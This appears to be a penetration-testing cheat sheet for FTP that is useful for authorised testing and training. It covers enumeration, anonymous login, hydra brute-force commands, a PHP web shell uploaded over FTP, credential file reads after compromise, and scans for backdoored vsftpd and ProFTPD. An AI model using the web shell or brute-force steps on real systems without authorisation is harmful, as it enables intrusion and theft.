# FTP (21)

!!! tip "Start here"
    Always try anonymous login first. If you get in, check for write access, if the FTP root maps to a web directory, it's a direct file upload path.

---

## Enumeration

```bash
nmap -sV -p 21 --script ftp-anon,ftp-syst $IP
```

---

## FTP Login Syntax

```bash
ftp $IP
ftp> user USERNAME
```

---

## Anonymous Login

```bash
ftp $IP
ftp> user anonymous
# Use a benign email address as the password when prompted.

ftp> ls
ftp> dir
```

Mirror the entire directory without interacting manually:
```bash
wget --mirror --no-passive "ftp://anonymous:anonymous@$IP/"
```

---

## Brute Force

```bash
hydra -C approved-defaults.txt ftp://$IP
hydra -L users.txt -P passwords.txt ftp://$IP
```

---

## File Transfer

```bash
ftp> binary
ftp> get REMOTE_FILE LOCAL_FILE
ftp> put LOCAL_FILE REMOTE_FILE
```

Use binary mode before transferring archives, executables, images, or other non-text files.

---

## Web Shell Upload

If the FTP root maps to a web-accessible directory (`/var/www/html`):

```bash
# Create shell locally
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via FTP
ftp> put shell.php
```

Access at: `http://$IP/shell.php?cmd=id`

!!! warning "Watch out"
    Confirm the upload path is web-accessible before spending time on the shell. Upload a test file first and try to reach it over HTTP.

---

## Post-Exploitation

If you've compromised the host, check FTP config for stored credentials:

```bash
cat /etc/vsftpd.conf
grep ftp /etc/passwd
```

## Version-Specific Checks

For matching banners, Nmap includes targeted checks for the compromised [vsftpd 2.3.4 distribution (CVE-2011-2523)](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) and [ProFTPD 1.3.3c distribution (CVE-2010-20103)](https://nvd.nist.gov/vuln/detail/CVE-2010-20103). These CVEs apply only to specific malicious source distributions, not every server reporting the same version string. Treat a banner match as a lead rather than proof.

```bash
nmap -p 21 --script ftp-vsftpd-backdoor,ftp-proftpd-backdoor $IP
```
